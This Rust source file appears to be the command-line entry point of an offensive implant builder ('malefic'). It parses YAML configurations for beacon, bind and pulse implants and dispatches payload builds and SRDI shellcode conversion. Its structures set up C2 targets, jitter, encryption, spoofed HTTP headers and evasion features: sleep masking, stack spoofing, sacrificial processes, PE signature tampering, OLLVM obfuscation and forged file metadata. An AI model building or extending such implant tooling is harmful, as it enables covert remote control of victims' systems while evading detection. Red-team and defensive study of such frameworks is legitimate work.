#[allow(deprecated)]
#[macro_use]
extern crate lazy_static;
use clap::{Parser, ValueEnum};
use cmd::SrdiType;
use generate::{
    update_beacon_config, update_bind_config, update_common_config, update_prelude_config,
    update_pulse_config,
};

use build::*;
use jsonschema::Validator;
use serde::{Deserialize, Serialize};
use serde_json::Value as JsonValue;
use serde_yaml::Value as YamlValue;

use crate::build::payload::build_payload;
use crate::cmd::{BuildCommands, Cli, Commands, GenerateCommands, PayloadType, Tool};
use std::collections::HashMap;
use std::{fs, process};
use strum_macros::{Display, EnumString};

mod build;
mod cmd;
mod generate;
mod logger;
mod tool;

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Implant {
    basic: BasicConfig,
    implants: ImplantConfig,
    metadata: MetaData,
    pulse: PulseConfig,
    build: BuildConfig,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct BasicConfig {
    name: String,
    targets: Vec<String>,
    protocol: String,
    tls: bool,
    proxy: String,
    interval: u64,
    jitter: f64,
    ca: String,
    encryption: String,
    key: String,
    rem: REMConfig,
    http: HttpConfig,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct BuildConfig {
    zigbuild: bool,
    ollvm: Ollvm,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Ollvm {
    enable: bool,
    bcfobf: bool,
    splitobf: bool,
    subobf: bool,
    fco: bool,
    constenc: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct PulseConfig {
    flags: Flags,
    target: String,
    protocol: String,
    encryption: String,
    key: String,
    http: HttpConfig,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct REMConfig {
    link: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct HttpConfig {
    method: String,
    path: String,
    host: String,
    version: String,
    headers: HashMap<String, String>,
}

impl HttpConfig {
    pub fn build(self, length: u32) -> String {
        let mut http_request = format!("{} {} HTTP/{}\r\n", self.method, self.path, self.version);

        http_request.push_str(&format!("Host: {}\r\n", self.host));
        if length > 0 {
            http_request.push_str(&format!("Content-Length: {length}\r\n"));
        }
        http_request.push_str("Connection: close\r\n");
        for (key, value) in self.headers.clone() {
            http_request.push_str(&format!("{}: {}\r\n", key, value));
        }

        http_request.to_string()
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct PackResource {
    src: String,
    dst: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ImplantConfig {
    runtime: String,
    r#mod: String,
    register_info: bool,
    hot_load: bool,
    modules: Vec<String>,
    enable_3rd: bool,
    #[serde(rename = "3rd_modules")]
    third_modules: Vec<String>,
    flags: Flags,
    apis: Apis,
    alloctor: Alloctor,
    sleep_mask: bool,
    sacrifice_process: bool,
    fork_and_run: bool,
    hook_exit: bool,
    thread_stack_spoofer: bool,
    pe_signature_modify: PESignatureModify,
    #[serde(default)]
    pack: Vec<PackResource>,
    autorun: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Flags {
    start: u32, // Acutally it's a u8
    end: u32,   // Actually it's a u8
    magic: String,
    artifact_id: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Apis {
    level: String,
    priority: ApisPriority,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ApisPriority {
    normal: NormalPriority,
    dynamic: DynamicPriority,
    syscalls: SyscallPriority,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct NormalPriority {
    enable: bool,
    r#type: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct DynamicPriority {
    enable: bool,
    r#type: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct SyscallPriority {
    enable: bool,
    r#type: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Alloctor {
    inprocess: String,
    crossprocess: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct MetaData {
    remap_path: String,
    icon: String,
    compile_time: String,
    file_version: String,
    product_version: String,
    company_name: String,
    product_name: String,
    original_filename: String,
    file_description: String,
    internal_name: String,
    #[serde(default)]
    require_admin: bool,
    #[serde(default)]
    require_uac: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct PESignatureModify {
    feature: bool,
    modify: PESModify,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct PESModify {
    magic: String,
    signature: String,
}

#[derive(Debug, Clone, Copy, EnumString, Display, ValueEnum)]
pub enum Version {
    #[strum(serialize = "community")]
    Community,
    #[strum(serialize = "professional")]
    Professional,
    #[strum(serialize = "inner")]
    Inner,
}

#[derive(Debug, Clone, Copy, EnumString, Display)]
pub enum GenerateArch {
    #[strum(serialize = "x64")]
    X64,
    #[strum(serialize = "x86")]
    X86,
}

#[derive(Debug, Clone, Copy, EnumString, Display)]
pub enum TransportProtocolType {
    #[strum(serialize = "tcp")]
    Tcp,
    #[strum(serialize = "http")]
    Http,
    // #[strum(serialize = "https")]
    // Https,
}

#[derive(Debug, Clone, Copy, EnumString, Display)]
pub enum Platform {
    #[strum(serialize = "win")]
    Win,
    #[strum(serialize = "linux")]
    Linux,
    #[strum(serialize = "darwin")]
    Darwin,
}

static CONFIG_INNER_TEMPLATE: &str = "inner_template";
static CONFIG_PROFESSIONAL_TEMPLATE: &str = "professional_template";
static CONFIG_SCHEMA: &str = include_str!("../../config_lint.json");
static MALEFIC_WIN_KIT: &str = "malefic-win-kit";
static CONFIG_MALEFIC_WIN_KIT_PATH: &str = "../malefic-win-kit";

static CFG_TARGET_OS_WINDOWS: &str = "cfg(target_os = \"windows\")";
static PATH: &str = "path";
static TARGET: &str = "target";
static DEFAULT: &str = "default";
static FEATURES: &str = "features";
static PREBUILD: &str = "prebuild";
static SOURCE: &str = "source";
static COMMUNITY: &str = "community";
static PROFESSIONAL: &str = "professional";
// static DEPENDENCES: &str = "dependences";
static DEPENDENCICES: &str = "dependencies";

static RESOURCES_DIR: &str = "./resources/";

fn load_yaml_config(yaml_path: &str) -> anyhow::Result<Implant> {
    log_step!("Loading configuration from {}", yaml_path);
    let yaml_content = fs::read_to_string(yaml_path).map_err(|e| {
        log_error!("Failed to read YAML configuration file: {}", e);
        e
    })?;

    let config: Implant = serde_yaml::from_str(&yaml_content).map_err(|e| {
        log_error!("Failed to parse YAML configuration: {}", e);
        e
    })?;

    log_success!("Configuration loaded successfully");
    Ok(config)
}

fn validate_yaml_config(yaml_path: &str) -> anyhow::Result<()> {
    log_step!("Validating configuration schema...");
    let yaml_content = fs::read_to_string(yaml_path)?;
    let yaml_value: YamlValue = serde_yaml::from_str(&yaml_content)?;
    let json_value = serde_json::to_value(&yaml_value)?;

    let schema: JsonValue =
        serde_json::from_str(CONFIG_SCHEMA).expect("Failed to parse embedded JSON schema");

    let compiled_schema = Validator::new(&schema).expect("Invalid JSON Schema");

    if let Err(error) = compiled_schema.validate(&json_value) {
        log_error!("Schema validation failed: {}", error);
        process::exit(1);
    }

    log_success!("Configuration schema is valid");
    Ok(())
}

// Define the CLI structure

fn parse_generate(
    yaml_config: &mut Implant,
    config: &GenerateCommands,
    version: Version,
    source: bool,
) -> anyhow::Result<()> {
    log_step!("Starting configuration generation...");
    update_common_config(yaml_config, &version, source);

    let result = match config {
        GenerateCommands::Beacon => {
            log_info!("Generating beacon configuration");
            update_beacon_config(yaml_config)
        }
        GenerateCommands::Bind => {
            log_info!("Generating bind configuration");
            update_bind_config(yaml_config)
        }
        GenerateCommands::Prelude {
            yaml_path,
            resources,
            key,
            spite,
        } => {
            log_info!("Generating prelude configuration");
            update_prelude_config(yaml_path, resources, key, spite)
        }
        GenerateCommands::Modules { modules } => {
            if !modules.is_empty() {
                yaml_config.implants.modules = modules.split(",").map(|x| x.to_string()).collect();
                log_info!("Using modules: {:?}", yaml_config.implants.modules);
            }
            update_beacon_config(yaml_config)
        }
        GenerateCommands::Pulse { platform, arch } => {
            log_info!("Generating pulse configuration for {} {}", platform, arch);
            update_pulse_config(source)?;
            pulse_generate(yaml_config.pulse.clone(), *platform, *arch, version, source)
        }
    };

    if result.is_ok() {
        log_success!("Configuration generation completed successfully");
    }
    result
}

fn parse_build(
    config: &mut BuildConfig,
    build: &BuildCommands,
    target: &String,
) -> anyhow::Result<()> {
    let result = match build {
        BuildCommands::Malefic => build_payload(config, &PayloadType::MALEFIC, target),
        BuildCommands::Modules => build_payload(config, &PayloadType::MODULES, target),
        BuildCommands::Pulse => build_payload(config, &PayloadType::PULSE, target),
        BuildCommands::Prelude => build_payload(config, &PayloadType::PRELUDE, target),
    };
    result
}

fn parse_tool(tool: &Tool) -> anyhow::Result<()> {
    match tool {
        Tool::SRDI {
            r#type: srdi_type,
            input: src_path,
            platform,
            arch,
            output: target_path,
            function_name,
            userdata_path,
        } => {
            log_step!("Building SRDI...");
            log_info!(
                "Type: {}, Platform: {}, Arch: {}",
                srdi_type,
                platform,
                arch
            );

            let userdata = if userdata_path.is_empty() {
                Vec::new()
            } else {
                log_info!("Loading userdata from {}", userdata_path);
                fs::read(userdata_path)?
            };

            let result = match srdi_type {
                SrdiType::LINK => {
                    log_info!("Using LINK SRDI generator");
                    link_srdi_generator(
                        src_path,
                        *platform,
                        *arch,
                        target_path,
                        function_name,
                        &userdata,
                    )
                }
                SrdiType::MALEFIC => {
                    log_info!("Using MALEFIC SRDI generator");
                    malefic_srdi_generator(
                        src_path,
                        *platform,
                        *arch,
                        target_path,
                        function_name,
                        &userdata,
                    )
                }
            };

            if result.is_ok() {
                log_success!("SRDI build completed successfully");
            }
            result
        }
    }
}

fn main() -> anyhow::Result<()> {
    logger::init();
    let cli = Cli::parse();
    match &cli.command {
        Commands::Generate {
            version,
            source,
            config,
            command,
        } => {
            let mut implant_config = load_yaml_config(config)?;
            validate_yaml_config(config)?;
            parse_generate(&mut implant_config, command, *version, *source)
        }
        Commands::Build {
            config,
            target,
            command,
        } => {
            let mut implant_config = load_yaml_config(config)?;
            validate_yaml_config(config)?;
            parse_build(&mut implant_config.build, command, target)
        }
        Commands::Tool(tool) => parse_tool(tool),
    }
}
